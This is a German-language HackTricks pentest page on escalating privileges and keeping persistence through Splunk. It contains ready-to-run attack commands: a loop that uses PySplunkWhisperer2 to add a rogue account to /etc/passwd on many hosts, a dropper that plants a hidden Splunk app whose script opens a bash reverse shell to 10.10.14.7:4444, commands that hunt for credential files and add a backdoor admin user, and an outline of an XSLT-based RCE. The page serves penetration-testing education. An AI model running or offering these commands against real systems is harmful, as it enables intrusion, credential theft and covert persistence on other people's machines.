# Splunk LPE und Persistence

{{#include ../../banners/hacktricks-training.md}}

Wenn du eine Maschine **intern** oder **extern** **enumerierst** und feststellst, dass **Splunk läuft** (meist **8000** für die Web-UI und **8089** für die Management-API), können gültige Credentials oft durch App-Installation, scripted inputs oder Management-Aktionen in **code execution** umgewandelt werden. Wenn Splunk als **root** läuft, wird das häufig zu einer sofortigen **privilege escalation**.

Wenn du nur die generische Remote-Angriffsfläche, Enumeration oder den app-upload RCE-Pfad brauchst, schau dir an:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Wenn du **bereits root** bist und der Splunk-Dienst nicht nur auf localhost lauscht, kannst du außerdem **Splunk password hashes** stehlen, **encrypted secrets** wiederherstellen oder eine **malicious app** einsetzen, um lokal oder über mehrere forwarders hinweg Persistence zu behalten.

## Interessante lokale Dateien

Wenn du auf einem Host landest, auf dem Splunk oder Splunk Universal Forwarder läuft, sind diese normalerweise die interessantesten Pfade:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Wichtige Artefakte:

- **`$SPLUNK_HOME/etc/passwd`**: lokale Splunk-Benutzer und Passwort-Hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Schlüssel, den Splunk zum Verschlüsseln von Geheimnissen verwendet, die in mehreren `.conf`-Dateien gespeichert sind.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: anfängliche Admin-Bootstrap-Datei; nützlich in Gold-Images und bei Provisioning-Fehlern. Sie wird ignoriert, wenn `etc/passwd` bereits existiert.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: dort werden scripted inputs häufig aktiviert.
- **`$SPLUNK_HOME/etc/deployment-apps/`** oder **`$SPLUNK_HOME/etc/apps/`**: gute Orte, um eine persistente app zu verstecken oder zu prüfen, was bereits verteilt wird.

## Splunk Universal Forwarder Agent Exploit Summary

Für weitere Details siehe [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist nur eine Zusammenfassung:

**Exploit-Überblick:**
Ein Exploit, der den Splunk Universal Forwarder (UF) angreift, ermöglicht Angreifern mit dem **agent password**, beliebigen Code auf Systemen auszuführen, auf denen der Agent läuft, und kann dadurch potenziell einen großen Teil der Umgebung kompromittieren.

**Warum es funktioniert:**

- Der UF-Managementdienst ist häufig auf **TCP 8089** exponiert.
- Angreifer können sich an der API authentifizieren und den Forwarder anweisen, ein **malicious app bundle** zu installieren.
- Dieselbe Primitive kann lokal für **LPE** oder remote für **RCE** verwendet werden.
- Öffentliche Tools wie **SplunkWhisperer2** erstellen das app bundle automatisch und können Payloads für Linux-Ziele anpassen.

**Häufige Wege, das Passwort wiederherzustellen:**

- Klartext-Zugangsdaten in Dokumentation, Skripten, Shares oder Deployment-Automatisierung.
- Passwort-Hashes in `$SPLUNK_HOME/etc/passwd` mit anschließendem Offline-Cracking.
- Gold-Images oder Provisioning-Reste wie `user-seed.conf`.

**Auswirkungen:**

- SYSTEM/root-Level-Codeausführung auf jedem kompromittierten Host.
- Bereitstellung persistenter apps, Backdoors oder Ransomware.
- Deaktivierung oder Manipulation von Telemetrie, bevor die Daten weitergeleitet werden.

**Beispielbefehl für die Exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Verwendbare öffentliche exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

Wenn du **filesystem write access** als `root`/`splunk` hast oder authentifizierten Zugriff, um apps zu installieren, ist ein sehr zuverlässiger Persistence-Mechanismus, eine **custom app** mit einem **scripted input** abzulegen. Splunks eigene Dokumentation erwartet, dass scripted inputs in einem app directory liegen und über `inputs.conf` aktiviert werden.

Typisches Layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimale `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Schneller Linux-Dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Hinweise:

- Der gleiche Trick funktioniert auf **Universal Forwarder** mit `/opt/splunkforwarder/etc/apps/`.
- Angreifer tarnen sich oft, indem sie ein legitimes Add-on ändern, statt eine offensichtlich bösartige App zu erstellen.
- Auf einem **deployment server** wird das Platzieren einer bösartigen App in `deployment-apps/` zu **fleet-wide persistence**, weil Forwarders pollen, aktualisierte Apps herunterladen und sie oft neu starten, um sie anzuwenden.

## Credential Theft and Admin Takeover

Wenn du Splunk's lokale Dateien lesen kannst, gibt es normalerweise zwei gute Ziele: **Splunk admin access** wiederherstellen und **encrypted service credentials** wiederherstellen.

### Password hashes and local users

Splunk speichert lokale Authentifizierungsdaten in `etc/passwd`. Je nach Deployment kann das Knacken dieser Datei funktionierende Credentials für die Web-UI und die Management API wiederherstellen.

Wenn du bereits gültige **admin** Credentials hast und Splunk sein **native** authentication backend verwendet, kann die CLI selbst für Persistence verwendet werden:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` und verschlüsselte Werte

Splunk verwendet `etc/auth/splunk.secret`, um sensible Werte zu schützen, die in mehreren Konfigurationsdateien gespeichert sind. Wenn du sowohl das **secret** als auch die relevanten **`.conf`**-Dateien stehlen kannst, kannst du oft Folgendes wiederherstellen oder erneut verwenden:

- gemeinsame Secrets für forwarder/indexer wie `pass4SymmKey`
- TLS-Private-Key-Passwörter wie `sslPassword`
- LDAP-bind-Zugangsdaten wie `bindDNPassword`

Das ist nützlich für **lateral movement**, selbst wenn das Splunk-Admin-Passwort selbst nicht crackable ist.

### `user-seed.conf` abuse

`user-seed.conf` wird nur beim ersten Start oder wenn `etc/passwd` nicht existiert verwendet. Dadurch ist es auf einer laufenden Box weniger nützlich, aber sehr interessant in:

- kompromittierten Installation-Templates
- Container-Images
- unattended provisioning workflows
- Appliances, bei denen Splunk automatisch neu initialisiert wird

In solchen Fällen ermöglicht dir das Platzieren eines mit `splunk hash-passwd` erzeugten `HASHED_PASSWORD`, nach einem Redeployment auf stille Weise wieder Admin-Zugriff zu erhalten.

## Abusing Splunk Queries

Für weitere Details siehe [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Eine nützliche jüngere Technik ist das Ausnutzen von **user-supplied XSLT** in verwundbaren Splunk-Enterprise-Versionen, um einen authentifizierten Account mit geringer Berechtigung in **OS command execution** als der Benutzer `splunk` umzuwandeln.

High-level flow:

1. Bei Splunk authentifizieren.
2. Eine schädliche **XSL**-Datei über die preview/upload functionality hochladen.
3. Splunk veranlassen, Suchergebnisse mit dem hochgeladenen Stylesheet aus dem **dispatch**-Verzeichnis zu rendern.
4. Das XSLT-Payload nutzen, um eine Datei zu schreiben oder Ausführung über Splunks search pipeline auszulösen (zum Beispiel durch das Erreichen interner Funktionalität wie `runshellscript`).

Die wichtige offensive Erkenntnis ist, dass dieser Pfad **post-auth RCE without needing app upload** ist. Unter Linux landet man dabei normalerweise im **`splunk`**-Account, was trotzdem wertvoll ist, weil dieser Benutzer oft den Anwendungsbaum besitzt, Secrets lesen kann und persistente Apps platzieren kann, die einen Shell-Verlust überstehen.

Ein repräsentativer Pfad, der während der Ausnutzung verwendet wird, ist:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Wenn Splunk mit zu vielen Rechten läuft oder wenn der `splunk`-Benutzer Zugriff auf gefährliche Scripts, beschreibbare service units oder schlechte `sudo`-Regeln hat, wird daraus eine saubere **LPE**-Kette.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
